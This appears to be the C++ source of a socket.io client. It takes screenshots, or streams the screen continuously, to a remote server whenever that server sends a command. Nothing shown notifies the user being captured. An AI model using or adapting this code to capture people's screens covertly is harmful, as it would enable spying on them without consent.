#include <Client.h>

#define SIOSTR(str) sio::string_message::create(str)

namespace silence
{
    Client::Client(const std::string &url)
        : mUrl(url), mIO(new sio::client())
    {
        using namespace std::placeholders;
        mSocket = mIO->socket();

        // bind events
        mSocket->on("command", std::bind(&Client::onCommand,
                                         this, _1, _2, _3, _4));

        mIO->set_socket_open_listener(std::bind(&Client::onConnected, this, _1));
        mIO->set_close_listener(std::bind(&Client::onClosed, this, _1));
        mIO->set_fail_listener(std::bind(&Client::onFailed, this));
    }

    Client::~Client()
    {
        mSocket->off_all();
        mSocket->off_error();
    }

    void Client::connect()
    {
        mIO->connect(mUrl);
        mLock.lock();
        if (!connectFinished)
        {
            mCond.wait(mLock);
        }
        mLock.unlock();
    }

    void Client::onConnected(const std::string &nsp)
    {
        std::cout << "Connected with server on nsp: " << nsp << std::endl;
    }

    void Client::onFailed()
    {
        std::cout << "sio failed" << std::endl;
    }

    void Client::onClosed(sio::client::close_reason const &reason)
    {
        std::cout << reason << std::endl;
        std::cout << "sio closed" << std::endl;
    }

    sio::message::list
    Client::createObject(const std::map<std::string, sio::message::ptr> &object)
    {
        auto obj = sio::object_message::create();
        obj.get()->get_map() = object;
        return obj;
    }

    void Client::onCommand(std::string const &name,
                           sio::message::ptr const &data,
                           bool hasAck,
                           sio::message::list &ack_resp)
    {
        auto commandObject = data->get_map();
        std::string event = commandObject["event"]->get_string();
        std::cout << event << std::endl;

        if (event == "start stream")
        {
            std::thread thread(std::bind(&Client::startStreamEvent, this));
            thread.detach();
        }
        else if (event == "kill stream")
        {
            std::thread thread(std::bind(&Client::killStreamEvent, this));
            thread.detach();
        }
        else if (event == "screenshot")
        {
            std::thread thread(std::bind(&Client::screenshotEvent, this));
            thread.detach();
        }
        else
        {
            std::thread thread(std::bind(&Client::errorEvent, this, std::placeholders::_1,
                                         std::placeholders::_2),
                               event, "Invalid event");
            thread.detach();
        }
    }

    void Client::screenshotEvent()
    {
        impl::Screenshot screen;
        cv::Mat image{screen.take()};

        mSocket->emit("screenshot",
                      impl::toBinaryString(image));
    }

    void Client::killStreamEvent()
    {
        std::unique_lock<std::mutex> lockGuard(mStreamLocker);

        if (!mStreamRunning)
        {
            errorEvent("kill stream", "Stream is already killed");
            return;
        }

        mStreamRunning = false;
        infoEvent("Successfully killed stream");
    }

    void Client::startStreamEvent()
    {
        std::unique_lock<std::mutex> lockGuard(mStreamLocker);
        mStreamRunning = true;
        lockGuard.unlock();

        impl::Screenshot screen;
        while (true)
        {
            lockGuard.lock();
            if (!mStreamRunning)
                return;
            lockGuard.unlock();

            cv::Mat image{screen.take()};
            mSocket->emit("frame",
                          impl::toBinaryString(image));
        }
    }

    void Client::errorEvent(const std::string &event, const std::string &msg)
    {
        mSocket->emit("error", createObject({{"event", SIOSTR(event)},
                                             {"msg", SIOSTR(msg)}}));
    }

    void Client::infoEvent(const std::string &info)
    {
        mSocket->emit("info", createObject({{"msg", SIOSTR(info)}}));
    }
}